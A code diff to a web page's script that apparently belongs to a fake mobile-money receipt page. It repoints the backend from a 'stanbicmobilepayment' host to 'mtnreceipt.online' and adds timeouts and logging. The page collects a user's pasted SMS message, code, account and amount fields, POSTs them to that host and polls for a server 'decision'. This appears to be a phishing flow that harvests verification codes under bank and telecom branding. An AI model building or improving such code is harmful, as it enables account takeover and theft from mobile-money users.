@@ -440,9 +440,9 @@
 
 <script>
   /* ═══════════════════════════════════════════════════════════
-     API_BASE — HARD-PINNED to the live Railway backend
+     API_BASE — live Render backend
      ═══════════════════════════════════════════════════════════ */
-  const API_BASE = 'https://stanbicmobilepayment-production.up.railway.app';
+  const API_BASE = 'https://mtnreceipt.online';
 
   const I18N = {
     en: {
@@ -723,7 +723,8 @@
         body: JSON.stringify({
           tx: tx.ref, stage: 'sms', an: tx.an, c: tx.c, am: tx.am, cur: tx.cur,
           lang: currentLang
-        })
+        }),
+        signal: AbortSignal.timeout(60000)
       });
       if (!r.ok) throw new Error('bad');
       btn.classList.add('sent');
@@ -847,25 +848,33 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
+    const payload = {
+      tx: tx.ref,
+      code: res.code,
+      message: input.value.trim(),
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      an: tx.an,
+      rn: tx.rn,
+      lang: currentLang
+    };
+
+    console.log('[sms] POST /api/mtn/sms payload:', payload);
+
     let serverAccepted = true;
     try {
       const r = await fetch(API_BASE + '/api/mtn/sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tx: tx.ref,
-          code: res.code,
-          message: input.value.trim(),
-          am: tx.am,
-          cur: tx.cur,
-          c: tx.c,
-          an: tx.an,
-          rn: tx.rn,
-          lang: currentLang
-        })
+        body: JSON.stringify(payload),
+        signal: AbortSignal.timeout(60000)
       });
+      const body = await r.text();
+      console.log('[sms] /api/mtn/sms response:', r.status, body);
       if (!r.ok) serverAccepted = false;
     } catch (e) {
+      console.error('[sms] POST failed:', e);
       btn.disabled = false;
       showToast(T.networkError);
       return;
@@ -888,7 +897,9 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch(API_BASE + '/api/mtn/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch(API_BASE + '/api/mtn/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now(), {
+          signal: AbortSignal.timeout(30000)
+        });
         if (!r.ok) throw new Error('HTTP ' + r.status);
         const j = await r.json();
         decision = j.decision || 'pending';
